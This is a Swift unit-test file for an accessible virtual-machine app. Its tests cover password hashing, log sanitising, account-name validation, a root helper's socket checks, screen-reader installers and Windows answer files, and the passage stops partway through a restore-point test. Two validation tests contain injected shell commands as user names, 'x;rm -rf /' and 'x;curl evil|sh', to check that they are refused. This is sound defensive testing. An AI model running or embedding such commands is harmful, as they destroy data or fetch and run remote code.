// AVMLogicTests.swift
// AVM — Accessible Virtual Machine
//
// Tests for the logic that can run without a VM, a sysroot or a window.
// Each group names what it protects, because most of these guard a
// promise to users: passwords that work, logs without user names, a root
// helper that can't be aimed at someone else's socket.

import XCTest
import Foundation
@testable import AVMLogic

// MARK: - Ubuntu password hashing

final class SHA512CryptTests: XCTestCase {
    /// The reference vector from the SHA-crypt specification (Drepper).
    /// If this ever fails, Ubuntu would reject every password AVM sets.
    func testSpecificationVector() {
        XCTAssertEqual(
            SHA512Crypt.hash(password: "Hello world!", salt: "saltstring"),
            "$6$saltstring$svn8UoSVapNtMuq1ukKS4tPQd8iKwSMHWjl/O817G3uBnIFNjnQJuesI68u4OTLiBFdcbYEdFCoEOfaS35inz1"
        )
    }

    func testRandomSaltsDiffer() {
        let a = SHA512Crypt.hash(password: "same")
        let b = SHA512Crypt.hash(password: "same")
        XCTAssertTrue(a.hasPrefix("$6$"))
        XCTAssertNotEqual(a, b, "two hashes of one password must use different salts")
    }
}

// MARK: - The diagnostic log never carries the user name

final class SanitizerTests: XCTestCase {
    func testHomePathIsReplaced() {
        XCTAssertEqual(AVMLog.sanitize("/Users/\(NSUserName())/Downloads/x.iso"), "~/Downloads/x.iso")
    }

    func testAnyCapitalisationOfTheShortName() throws {
        let user = NSUserName()
        try XCTSkipIf(user.count < 4, "short names are deliberately not replaced inside words")
        let text = "a \(user.uppercased()) b \(user.lowercased()) c"
        XCTAssertFalse(AVMLog.sanitize(text).localizedCaseInsensitiveContains(user))
    }

    func testOrdinaryWordsSurvive() {
        XCTAssertEqual(AVMLog.sanitize("the virtual machine started"), "the virtual machine started")
    }
}

// MARK: - Saved configurations

final class VMConfigurationTests: XCTestCase {
    /// A configuration saved by AVM 0.1.2, before every setting added
    /// since. It must still load, or every VM in the file disappears.
    func testOldConfigurationStillLoads() throws {
        let json = """
        [{"id":"F48267BA-0CA9-49E4-BD2A-3190FCD06455","name":"Old PC","cpuCount":4,
          "ramSizeGB":8,"diskSizeGB":64,"diskImagePath":"/tmp/disk.qcow2"}]
        """
        let configs = try JSONDecoder().decode([VMConfiguration].self, from: Data(json.utf8))
        let config = try XCTUnwrap(configs.first)
        XCTAssertEqual(config.guestOS, .windows)
        XCTAssertNil(config.windowsEdition)
        XCTAssertFalse(config.isStoredElsewhere)
        XCTAssertFalse(config.usesSecureBoot)
        XCTAssertTrue(config.sharesClipboard)
        XCTAssertEqual(config.effectiveUSBMode, .ask)
        XCTAssertTrue(config.brailleFollowsBack, "existing VMs keep the behavior they had")
    }

    func testUnknownWordsReadAsDefaults() throws {
        let json = """
        [{"id":"F48267BA-0CA9-49E4-BD2A-3190FCD06455","name":"x","cpuCount":2,"ramSizeGB":4,
          "diskSizeGB":40,"diskImagePath":"","usbMode":"someday","guestOSName":"beos",
          "windowsEditionName":"enterprise"}]
        """
        let config = try XCTUnwrap(try JSONDecoder().decode([VMConfiguration].self, from: Data(json.utf8)).first)
        XCTAssertEqual(config.effectiveUSBMode, .ask)
        XCTAssertEqual(config.guestOS, .windows)
        XCTAssertNil(config.windowsEdition)
    }

    func testEditionsSelectTheRightImageAndKey() {
        XCTAssertEqual(WindowsEdition.pro.imageName, "Windows 11 Pro")
        XCTAssertEqual(WindowsEdition.pro.genericProductKey, "VK7JG-NPHTM-C97JM-9MPGT-3V66T")
        XCTAssertEqual(Set(WindowsEdition.allCases.map(\.genericProductKey)).count, WindowsEdition.allCases.count)
    }

    func testExternalDriveNameAndMissingDrive() {
        var config = VMConfiguration(name: "Travel PC")
        config.storageFolderPath = "/Volumes/Backup Drive/AVM Virtual Machines/\(config.id.uuidString)"
        XCTAssertEqual(config.storageDriveName, "Backup Drive")
        XCTAssertTrue(config.storageIsMissing)
        XCTAssertTrue(config.storageMissingMessage.contains("Backup Drive"))
    }

    /// A missing folder (an unplugged drive) shares nothing, rather than
    /// handing QEMU a path that isn't there.
    func testSharedFolderOnlyWhenItExists() throws {
        var config = VMConfiguration()
        XCTAssertNil(config.sharedFolderURL)
        config.sharedFolderPath = "/Volumes/Not Plugged In \(UUID().uuidString)"
        XCTAssertNil(config.sharedFolderURL)
        config.sharedFolderPath = NSTemporaryDirectory()
        XCTAssertNotNil(config.sharedFolderURL)
        XCTAssertFalse(config.sharedFolderIsReadOnly)
    }

    /// The shorter audio path must keep the names spice-gtk looks up, or
    /// it would play nothing at all.
    func testLowLatencyPipelineKeepsSpiceGtksElementNames() {
        XCTAssertTrue(SpiceAudioPipeline.lowLatency.hasPrefix("appsrc "))
        XCTAssertTrue(SpiceAudioPipeline.lowLatency.contains(#"name="appsrc""#))
        XCTAssertTrue(SpiceAudioPipeline.lowLatency.contains(#"name="audiosink""#))
        XCTAssertFalse(VMConfiguration().usesLowAudioLatency, "off unless chosen")
    }

    func testStoredHereByDefault() throws {
        let config = VMConfiguration()
        XCTAssertNil(config.storageDriveName)
        XCTAssertFalse(config.storageIsMissing)
        XCTAssertEqual(try config.directoryURL().lastPathComponent, config.id.uuidString)
    }

    /// QEMU reads a comma as the next option: "/Volumes/Backup, 2TB" used
    /// to stop that VM ever starting.
    func testCommasAreEscapedForQEMU() {
        XCTAssertEqual(QEMUOption.value("/Volumes/Backup, 2TB/disk.qcow2"), "/Volumes/Backup,, 2TB/disk.qcow2")
        XCTAssertEqual(QEMUOption.value("/plain/path"), "/plain/path")
    }
}

// MARK: - Ubuntu's unattended install

final class UbuntuAccountTests: XCTestCase {
    func testSystemNamesAreRefused() {
        for name in ["root", "audio", "video", "plugdev", "systemd-resolve", "ubuntu"] {
            XCTAssertNotNil(UbuntuAccount.problem(withUserName: name), "\(name) should be refused")
        }
    }

    func testOrdinaryNamesAreAccepted() {
        XCTAssertNil(UbuntuAccount.problem(withUserName: "amena"))
        XCTAssertNil(UbuntuAccount.problem(withUserName: "a_b-1"))
    }

    func testMalformedNamesAreRefused() {
        for name in ["", "Amena", "1abc", "a b", "x;rm -rf /", String(repeating: "a", count: 33)] {
            XCTAssertNotNil(UbuntuAccount.problem(withUserName: name), "\(name) should be refused")
        }
        XCTAssertNotNil(UbuntuAccount.problem(withRealName: "Name: With Colon"))
    }

    /// A hand-edited account file must not be able to put shell text into
    /// the root install script.
    func testLoadRejectsAnUnsafeSavedName() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let bad = #"{"realName":"X","userName":"x;curl evil|sh","passwordHash":"$6$a$b","signInAutomatically":true}"#
        try bad.write(to: dir.appendingPathComponent(UbuntuAccount.fileName), atomically: true, encoding: .utf8)
        XCTAssertNil(UbuntuAccount.load(fromVMDirectory: dir))
    }

    /// An account an older build saved with a backslash in the full name
    /// (it joined preseed lines) is cleaned on load, not dropped: dropping
    /// it left the machine unable to install (2026-10-28).
    func testLoadCleansABackslashInTheFullName() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let saved = #"{"realName":"Jean Dupont\\","userName":"jean","passwordHash":"$6$a$b","signInAutomatically":true}"#
        try saved.write(to: dir.appendingPathComponent(UbuntuAccount.fileName), atomically: true, encoding: .utf8)
        XCTAssertEqual(UbuntuAccount.load(fromVMDirectory: dir)?.realName, "Jean Dupont")
        let onlyBad = #"{"realName":"\\:,=","userName":"jean","passwordHash":"$6$a$b","signInAutomatically":true}"#
        try onlyBad.write(to: dir.appendingPathComponent(UbuntuAccount.fileName), atomically: true, encoding: .utf8)
        XCTAssertEqual(UbuntuAccount.load(fromVMDirectory: dir)?.realName, "jean")
    }

    func testSavedAccountIsOwnerOnly() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let account = UbuntuAccount(realName: "A", userName: "amena", passwordHash: "$6$a$b", signInAutomatically: false)
        try account.save(inVMDirectory: dir)
        let mode = try FileManager.default.attributesOfItem(atPath: dir.appendingPathComponent(UbuntuAccount.fileName).path)[.posixPermissions] as? Int
        XCTAssertEqual(mode, 0o600)
        XCTAssertEqual(UbuntuAccount.load(fromVMDirectory: dir), account)
    }

    /// Every layout in the table must also pass load()'s own check, or a
    /// VM made with that layout could never install.
    func testKeyboardTableMatchesTheLoadCheck() {
        for (id, layout) in UbuntuKeyboard.table {
            XCTAssertNotNil(layout.layout.range(of: "^[a-z]{2,8}$", options: .regularExpression), "\(id) layout")
            if let variant = layout.variant {
                XCTAssertNotNil(variant.range(of: "^[a-z_]{1,16}$", options: .regularExpression), "\(id) variant")
            }
        }
    }

    func testYAMLQuotingEscapes() {
        XCTAssertEqual(UbuntuInstallPipeline.yamlQuoted(#"Kelly "K" Ford"#), #""Kelly \"K\" Ford""#)
    }
}

// MARK: - The root USB helper's socket check

final class StreamSocketCheckTests: XCTestCase {
    private var root = ""
    private var dir = ""
    private var socketPath = ""
    private var fd: Int32 = -1

    override func setUpWithError() throws {
        let uid = getuid()
        root = "/tmp/avm-\(uid)"
        dir = "\(root)/\(UUID().uuidString)"
        socketPath = "\(dir)/usbredir-5.sock"
        mkdir(root, 0o700)
        chmod(root, 0o700)
        XCTAssertEqual(mkdir(dir, 0o700), 0)
        fd = socket(AF_UNIX, SOCK_STREAM, 0)
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        _ = withUnsafeMutableBytes(of: &address.sun_path) { buffer in
            socketPath.utf8CString.withUnsafeBytes { buffer.copyMemory(from: $0) }
        }
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                Darwin.bind(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size))
            }
        }
        XCTAssertEqual(bound, 0)
    }

    override func tearDown() {
        Darwin.close(fd)
        unlink(socketPath)
        rmdir(dir)
    }

    func testTheUsersOwnSocketIsAccepted() {
        XCTAssertNil(streamSocketProblem(socketPath, uid: getuid()))
    }

    /// The root AVM falls back to when another account holds
    /// /tmp/avm-<uid> (2026-10-28): six lower-case hex digits, no other tail.
    func testTheFallbackRootIsAcceptedAndOnlyThatShape() throws {
        let uid = getuid()
        let other = "/tmp/avm-\(uid)-0a1b2c"
        let otherDir = "\(other)/\(UUID().uuidString)"
        let otherSocket = "\(otherDir)/hidbridge-6.sock"
        mkdir(other, 0o700)
        chmod(other, 0o700)
        XCTAssertEqual(mkdir(otherDir, 0o700), 0)
        let otherFD = socket(AF_UNIX, SOCK_STREAM, 0)
        defer { Darwin.close(otherFD); unlink(otherSocket); rmdir(otherDir); rmdir(other) }
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        _ = withUnsafeMutableBytes(of: &address.sun_path) { buffer in
            otherSocket.utf8CString.withUnsafeBytes { buffer.copyMemory(from: $0) }
        }
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                Darwin.bind(otherFD, $0, socklen_t(MemoryLayout<sockaddr_un>.size))
            }
        }
        XCTAssertEqual(bound, 0)
        XCTAssertNil(streamSocketProblem(otherSocket, uid: uid))
        for wrong in ["/tmp/avm-\(uid)-0A1B2C/\(UUID().uuidString)/usbredir-5.sock",
                      "/tmp/avm-\(uid)-0a1b2c7/\(UUID().uuidString)/usbredir-5.sock",
                      "/tmp/avm-\(uid)x/\(UUID().uuidString)/usbredir-5.sock",
                      "/tmp/avm-\(uid)-/\(UUID().uuidString)/usbredir-5.sock"] {
            XCTAssertNotNil(streamSocketProblem(wrong, uid: uid), wrong)
        }
    }

    /// A Bluetooth device's socket (2026-10-27): hidbridge-<5…8>.sock, in
    /// the same private folder; other names stay refused.
    func testABluetoothDevicesSocketIsAccepted() {
        let bridge = "\(dir)/hidbridge-6.sock"
        let other = socket(AF_UNIX, SOCK_STREAM, 0)
        defer { Darwin.close(other); unlink(bridge) }
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        _ = withUnsafeMutableBytes(of: &address.sun_path) { buffer in
            bridge.utf8CString.withUnsafeBytes { buffer.copyMemory(from: $0) }
        }
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                Darwin.bind(other, $0, socklen_t(MemoryLayout<sockaddr_un>.size))
            }
        }
        XCTAssertEqual(bound, 0)
        XCTAssertNil(streamSocketProblem(bridge, uid: getuid()))
        XCTAssertNotNil(streamSocketProblem("\(dir)/hidbridge-9.sock", uid: getuid()))
        XCTAssertNotNil(streamSocketProblem("\(dir)/bridge-6.sock", uid: getuid()))
    }

    func testAnotherUserIsRefused() {
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid() + 1))
    }

    func testPathsOutsideThePrivateFolderAreRefused() {
        let uid = getuid()
        for path in ["/tmp/elsewhere/\(UUID().uuidString)/usbredir-5.sock",
                     "\(dir)/qmp.sock",
                     "\(root)/../avm-\(uid)/\(URL(fileURLWithPath: dir).lastPathComponent)/usbredir-5.sock",
                     "/var/run/usbmuxd"] {
            XCTAssertNotNil(streamSocketProblem(path, uid: uid), path)
        }
    }

    func testAFolderOthersCanOpenIsRefused() {
        chmod(dir, 0o755)
        defer { chmod(dir, 0o700) }
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid()))
    }

    func testASymlinkInPlaceOfTheFolderIsRefused() throws {
        let real = "\(root)/real-\(UUID().uuidString)"
        XCTAssertEqual(rename(dir, real), 0)
        XCTAssertEqual(symlink(real, dir), 0)
        defer {
            unlink(dir)
            rename(real, dir)
        }
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid()))
    }
}

// MARK: - Screen readers installed with Windows

final class ScreenReaderInstallerTests: XCTestCase {
    /// The shape of a winget installer manifest: one entry per architecture.
    private let manifest = """
    PackageIdentifier: FreedomScientific.JAWS.2026
    Installers:
    - Architecture: x64
      InstallerUrl: https://software.vfo.digital/JAWS/x64.exe
      InstallerSha256: 1111111111111111111111111111111111111111111111111111111111111111
    - Architecture: arm64
      InstallerUrl: https://software.vfo.digital/JAWS/arm64.exe
      InstallerSha256: c73c2a2a5a057cf0383e8409ef6ae1b00e8fb8b78b58036e4457daae095c73d5
    ManifestType: installer
    """

    func testPicksTheARMInstaller() throws {
        let found = try ScreenReaderInstallers.installer(.jaws, version: "1", yaml: manifest, architecture: "arm64")
        XCTAssertEqual(found.url.lastPathComponent, "arm64.exe")
        XCTAssertEqual(found.checksum, .sha256("C73C2A2A5A057CF0383E8409EF6AE1B00E8FB8B78B58036E4457DAAE095C73D5"))
    }

    /// NV Access's feed is newer than winget's list: 2026.3 was out while
    /// winget still listed 2026.2.
    func testReadsNVAccessUpdateFeed() throws {
        let feed = """
        apiCompatTo: 2026.1.0
        apiVersion: 2026.3.0
        launcherHash: c5e02b5b12da149d92b8802172e6d683e7c77175
        launcherUrl: https://download.nvaccess.org/releases/2026.3/nvda_2026.3.exe
        version: 2026.3
        """
        let found = try ScreenReaderInstallers.nvAccessRelease(text: feed)
        XCTAssertEqual(found.version, "2026.3")
        XCTAssertEqual(found.url.host, ScreenReader.nvda.vendorHost)
        XCTAssertEqual(found.checksum, .sha1("C5E02B5B12DA149D92B8802172E6D683E7C77175"))
        XCTAssertThrowsError(try ScreenReaderInstallers.nvAccessRelease(text: "version: 2026.3"))
    }

    func testAMissingArchitectureIsAnError() {
        XCTAssertThrowsError(try ScreenReaderInstallers.installer(.jaws, version: "1", yaml: manifest, architecture: "x86"))
    }

    func testPinnedDownloadsAreOnTheMakersOwnHosts() {
        for reader in ScreenReader.allCases {
            let pinned = ScreenReaderInstallers.pinned[reader]
            XCTAssertEqual(pinned?.url.host, reader.vendorHost)
            XCTAssertEqual(pinned?.url.scheme, "https")
            if case .sha256(let hash) = pinned?.checksum { XCTAssertEqual(hash.count, 64) } else { XCTFail("pinned versions use SHA-256") }
        }
    }

    func testOnlyChosenReadersAreInstalled() {
        var config = VMConfiguration()
        XCTAssertTrue(config.windowsScreenReaders.isEmpty, "older VMs: Narrator only")
        config.windowsScreenReaderNames = ["jaws", "orca", "nvda"]
        XCTAssertEqual(config.windowsScreenReaders, [.nvda, .jaws])
    }

    func testTheChecksumIsOfTheFile() throws {
        let file = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try Data("abc".utf8).write(to: file)
        defer { try? FileManager.default.removeItem(at: file) }
        XCTAssertEqual(try ScreenReaderInstallers.sha256(of: file),
                       "BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD")
    }
}

// MARK: - Windows setup skips the region and keyboard pages

final class WindowsRegionTests: XCTestCase {
    func testMacLocalesBecomeWindowsLocales() {
        XCTAssertEqual(WindowsRegion.windowsLocale(fromMac: "en_US"), "en-US")
        XCTAssertEqual(WindowsRegion.windowsLocale(fromMac: "en_GB@rg=gbzzzz"), "en-GB")
        XCTAssertNil(WindowsRegion.windowsLocale(fromMac: "en"), "no country: let Windows ask")
        XCTAssertNil(WindowsRegion.windowsLocale(fromMac: "zh-Hans_CN"), "a script code: let Windows ask")
    }

    func testEveryKeyboardIsAWindowsLayoutPair() {
        for (mac, windows) in WindowsRegion.keyboards {
            XCTAssertNotNil(windows.id.range(of: "^[0-9a-f]{4}:[0-9a-f]{8}$", options: .regularExpression), mac)
            XCTAssertFalse(windows.name.isEmpty, mac)
        }
        XCTAssertEqual(Set(WindowsRegion.windowsKeyboards.map(\.id)).count, WindowsRegion.windowsKeyboards.count)
    }

    func testOnlyCertainSettingsAreWritten() {
        XCTAssertEqual(WindowsRegion().answerFileComponent, "", "nothing known: the marker just goes")
        let keyboardOnly = WindowsRegion(locale: nil, inputLocale: "0809:00000809").answerFileComponent
        XCTAssertTrue(keyboardOnly.contains("<InputLocale>0809:00000809</InputLocale>"))
        XCTAssertFalse(keyboardOnly.contains("UserLocale"))
    }

    /// The marker Stage 4 replaces must stay in the answer file.
    func testTheAnswerFileKeepsItsRegionMarker() throws {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent()
            .appendingPathComponent("../../Resources/autounattend.xml").standardizedFileURL
        let text = try String(contentsOf: url, encoding: .utf8)
        XCTAssertTrue(text.contains("<!--AVM_INTERNATIONAL-->"))
        XCTAssertTrue(text.contains("<HideEULAPage>true</HideEULAPage>"))
    }
}

// MARK: - The wizard's answer file

final class WindowsSetupAnswersTests: XCTestCase {
    /// Windows' documented form: base64 of UTF-16LE password + "Password".
    func testPasswordEncodingMatchesWindows() {
        XCTAssertEqual(WindowsSetupAnswers.encode(password: ""), "UABhAHMAcwB3AG8AcgBkAA==")
        XCTAssertEqual(Data(base64Encoded: WindowsSetupAnswers.encode(password: "ab"))?.count, 20)
    }

    func testComputerNames() {
        XCTAssertNil(WindowsSetupAnswers.problem(withComputerName: "Amenas-PC"))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withComputerName: "1234"))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withComputerName: "sixteen-letters1"))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withComputerName: "my pc"))
        XCTAssertEqual(WindowsSetupAnswers.suggestedComputerName(from: "Amena's PC"), "Amenas-PC")
        XCTAssertEqual(WindowsSetupAnswers.suggestedComputerName(from: "Windows 11 ARM test machine"), "Windows-11-ARM")
        XCTAssertEqual(WindowsSetupAnswers.suggestedComputerName(from: "ʼʼʼ"), "AVM-PC")
    }

    func testUserNames() {
        XCTAssertNil(WindowsSetupAnswers.problem(withUserName: "amena", computerName: "Amenas-PC"))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withUserName: "Administrator", computerName: nil))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withUserName: "a@b", computerName: nil))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withUserName: "amenas-pc", computerName: "Amenas-PC"))
    }

    func testTimeZonesComeFromICU() {
        XCTAssertEqual(WindowsSetupAnswers.windowsTimeZone(for: "America/Chicago"), "Central Standard Time")
        XCTAssertNil(WindowsSetupAnswers.windowsTimeZone(for: "Not/AZone"))
        XCTAssertTrue(WindowsSetupAnswers.allWindowsTimeZones.contains("GMT Standard Time"))
    }

    /// Every marker filled, the result well-formed, and a name with XML
    /// characters in it written safely.
    func testTheFilledAnswerFileIsValidXML() throws {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent()
            .appendingPathComponent("../../Resources/autounattend.xml").standardizedFileURL
        var text = try String(contentsOf: url, encoding: .utf8)
        let answers = WindowsSetupAnswers(
            locale: "en-GB", inputLocale: "0809:00000809", computerName: "Amenas-PC",
            timeZone: "GMT Standard Time", privacy: .recommended,
            localAccount: .init(userName: "amena", displayName: "Amena <\"&'> T", encodedPassword: WindowsSetupAnswers.encode(password: "pw"))
        )
        for (marker, section) in answers.answerFileSections {
            XCTAssertTrue(text.contains(marker), marker)
            text = text.replacingOccurrences(of: marker, with: section)
        }
        XCTAssertTrue(XMLParser(data: Data(text.utf8)).parse())
        for expected in ["<ComputerName>Amenas-PC</ComputerName>", "<TimeZone>GMT Standard Time</TimeZone>",
                         "<ProtectYourPC>1</ProtectYourPC>", "<HideOnlineAccountScreens>true</HideOnlineAccountScreens>",
                         "<LogonCount>1</LogonCount>", "Amena &lt;&quot;&amp;&apos;&gt; T", "<UserLocale>en-GB</UserLocale>",
                         "keyboardLayout = laptop", "NVDAModifierKeys = 7"] {
            XCTAssertTrue(text.contains(expected), expected)
        }
        // A Microsoft account and nothing else answered: still valid.
        var plain = try String(contentsOf: url, encoding: .utf8)
        for (marker, section) in WindowsSetupAnswers().answerFileSections {
            plain = plain.replacingOccurrences(of: marker, with: section)
        }
        XCTAssertTrue(XMLParser(data: Data(plain.utf8)).parse())
        XCTAssertFalse(plain.contains("<UserAccounts>"))
        var noLaptop = WindowsSetupAnswers(); noLaptop.nvdaLaptopLayout = false
        XCTAssertEqual(noLaptop.answerFileSections["<!--AVM_NVDA_SETTINGS-->"], "")
    }

    func testSavedAnswersAreOwnerOnlyAndForgetThePassword() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        var answers = WindowsSetupAnswers()
        answers.localAccount = .init(userName: "amena", displayName: "Amena", encodedPassword: "x")
        try answers.save(inVMDirectory: dir)
        let mode = try FileManager.default.attributesOfItem(atPath: dir.appendingPathComponent(WindowsSetupAnswers.fileName).path)[.posixPermissions] as? Int
        XCTAssertEqual(mode, 0o600)
        XCTAssertEqual(WindowsSetupAnswers.load(fromVMDirectory: dir), answers)
        WindowsSetupAnswers.forgetPassword(inVMDirectory: dir)
        XCTAssertNil(WindowsSetupAnswers.load(fromVMDirectory: dir)?.localAccount?.encodedPassword)
        XCTAssertEqual(WindowsSetupAnswers.load(fromVMDirectory: dir)?.localAccount?.userName, "amena")
    }
}

// MARK: - The QEMU guest agent's protocol

final class GuestAgentTests: XCTestCase {
    /// A stand-in agent: answers guest-sync with its id, after a stale
    /// reply from an earlier request, and guest-set-time with success.
    func testSyncsThenSetsTheTime() throws {
        let path = "/tmp/avm-qga-test-\(getpid()).sock"
        unlink(path)
        let server = socket(AF_UNIX, SOCK_STREAM, 0)
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        _ = withUnsafeMutableBytes(of: &address.sun_path) { buffer in path.utf8CString.withUnsafeBytes { buffer.copyMemory(from: $0) } }
        XCTAssertEqual(withUnsafePointer(to: &address) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { Darwin.bind(server, $0, socklen_t(MemoryLayout<sockaddr_un>.size)) } }, 0)
        XCTAssertEqual(listen(server, 1), 0)
        defer { Darwin.close(server); unlink(path) }

        let received = Locked<[String]>([])
        let agent = Thread {
            let client = accept(server, nil, nil)
            defer { Darwin.close(client) }
            var buffer = [UInt8](repeating: 0, count: 4096)
            var text = ""
            func reply(_ line: String) { let b = Array((line + "\n").utf8); _ = write(client, b, b.count) }
            while true {
                let n = read(client, &buffer, buffer.count)
                if n <= 0 { return }
                text += String(decoding: buffer[0..<n], as: UTF8.self)
                while let newline = text.firstIndex(of: "\n") {
                    let line = String(text[..<newline]); text.removeSubrange(...newline)
                    received.mutate { $0.append(line) }
                    if line.contains("guest-sync"), let id = line.split(separator: ":").last?.filter(\.isNumber) {
                        reply(#"{"return": 12345}"#)          // stale
                        reply(#"{"return": \#(id)}"#)
                    } else if line.contains("guest-set-time") {
                        reply(#"{"return": {}}"#)
                    }
                }
            }
        }
        agent.start()
        let replies = try GuestAgent.run([GuestAgent.setTimeCommand(now: Date(timeIntervalSince1970: 1_800_000_000))], socketPath: path)
        XCTAssertEqual(replies, [#"{"return": {}}"#])
        XCTAssertTrue(received.value.last?.contains(#""time":1800000000000000000"#) == true)
    }

    func testNoAgentIsAnErrorNotAHang() {
        XCTAssertThrowsError(try GuestAgent.run([GuestAgent.setTimeCommand()], socketPath: "/tmp/avm-no-such-agent.sock", timeout: 1))
    }
}

final class Locked<T>: @unchecked Sendable {
    private var stored: T
    private let lock = NSLock()
    init(_ value: T) { stored = value }
    var value: T { lock.lock(); defer { lock.unlock() }; return stored }
    func mutate(_ change: (inout T) -> Void) { lock.lock(); change(&stored); lock.unlock() }
}

// MARK: - What Windows Setup installed, said once

final class SetupReportTests: XCTestCase {
    private let everything = "specialize-done\nnvda-staged\njaws-installed\nvdagent-installed\nwebdavd-installed\nqemu-ga-installed\nnvda-installed\nfirst-sign-in-done\n"

    func testEverythingInstalled() throws {
        let summary = try XCTUnwrap(SetupReport.summary(reportText: everything, expectsJAWS: true, expectsNVDA: true))
        XCTAssertTrue(summary.complete)
        XCTAssertTrue(summary.message.hasPrefix("Windows setup installed everything: NVDA, JAWS,"))
    }

    func testAMissingInstallerIsNamedWithItsFix() throws {
        let report = everything.replacingOccurrences(of: "jaws-installed\n", with: "")
        let summary = try XCTUnwrap(SetupReport.summary(reportText: report, expectsJAWS: true, expectsNVDA: true))
        XCTAssertFalse(summary.complete)
        XCTAssertTrue(summary.message.contains("but JAWS didn't install"))
        XCTAssertTrue(summary.message.contains("freedomscientific.com"))
    }

    func testBeforeTheFirstSignInNVDAIsntMissing() throws {
        let report = "specialize-done\nvdagent-installed\nwebdavd-installed\nqemu-ga-installed\n"
        let summary = try XCTUnwrap(SetupReport.summary(reportText: report, expectsJAWS: false, expectsNVDA: true))
        // Not complete, and not "everything", until the first sign-in
        // (2026-10-28): nothing is missing, so no success sound either.
        XCTAssertFalse(summary.complete)
        XCTAssertTrue(summary.message.hasPrefix("Windows setup has installed"))
        XCTAssertFalse(summary.message.contains("didn't install"))
        XCTAssertTrue(summary.message.contains("NVDA installs when you first sign in"))
    }

    func testNoReportSaysNothing() {
        XCTAssertNil(SetupReport.summary(reportText: "", expectsJAWS: true, expectsNVDA: true))
    }

    func testLists() {
        XCTAssertEqual(SetupReport.list(["A"]), "A")
        XCTAssertEqual(SetupReport.list(["A", "B", "C"]), "A, B and C")
    }
}

// MARK: - Windows' own limits on the answer file

final class AnswerFileLimitsTests: XCTestCase {
    /// Windows Setup refuses the whole answer file, at the specialize pass,
    /// if a RunSynchronousCommand Path is over 259 characters (the install
    /// test's first run stopped there, 2026-10-26). CommandLine allows 1024.
    func testEveryCommandIsWithinWindowsLimits() throws {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent()
            .appendingPathComponent("../../Resources/autounattend.xml").standardizedFileURL
        var text = try String(contentsOf: url, encoding: .utf8)
        let answers = WindowsSetupAnswers(
            locale: "en-GB", inputLocale: "0809:00000809", computerName: "Amenas-PC",
            timeZone: "GMT Standard Time", privacy: .mostPrivate,
            localAccount: .init(userName: String(repeating: "a", count: 20), displayName: "Amena",
                                encodedPassword: WindowsSetupAnswers.encode(password: String(repeating: "p", count: 64))))
        for (marker, section) in answers.answerFileSections {
            text = text.replacingOccurrences(of: marker, with: section)
        }
        final class Collector: NSObject, XMLParserDelegate {
            var element = "", buffer = "", found: [(String, String)] = []
            func parser(_ p: XMLParser, didStartElement e: String, namespaceURI: String?, qualifiedName: String?, attributes: [String: String] = [:]) { element = e; buffer = "" }
            func parser(_ p: XMLParser, foundCharacters s: String) { buffer += s }
            func parser(_ p: XMLParser, didEndElement e: String, namespaceURI: String?, qualifiedName: String?) {
                if ["Path", "CommandLine", "Description"].contains(e) { found.append((e, buffer)) }
                buffer = ""
            }
        }
        let collector = Collector()
        let parser = XMLParser(data: Data(text.utf8))
        parser.delegate = collector
        XCTAssertTrue(parser.parse())
        XCTAssertFalse(collector.found.isEmpty)
        let limits = ["Path": 259, "CommandLine": 1024, "Description": 256]
        for (element, value) in collector.found {
            XCTAssertLessThanOrEqual(value.count, limits[element]!, "\(element): \(value.prefix(60))…")
        }
    }
}

// MARK: - The keyboard for Windows: HID usages to PC scancodes

final class MacRestorePointTests: XCTestCase {
    func testTakeListRestoreDelete() throws {
        // On the same volume as the build, which is APFS.
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let files = MacGuestFiles(folder: folder)
        try Data("before".utf8).write(to: files.disk)
        try Data("aux-before".utf8).write(to: files.auxiliaryStorage)
        try MacRestorePoints.take(files, name: "First")
        let points = MacRestorePoints.list(files)
        XCTAssertEqual(points.map(\.name), ["First"])
        try Data("after".utf8).write(to: files.disk)
        try Data("state".utf8).write(to: files.savedState)
        try MacRestorePoints.restore(points[0], into: files)
        XCTAssertEqual(try String(contentsOf: files.disk, encoding: .utf8), "before")
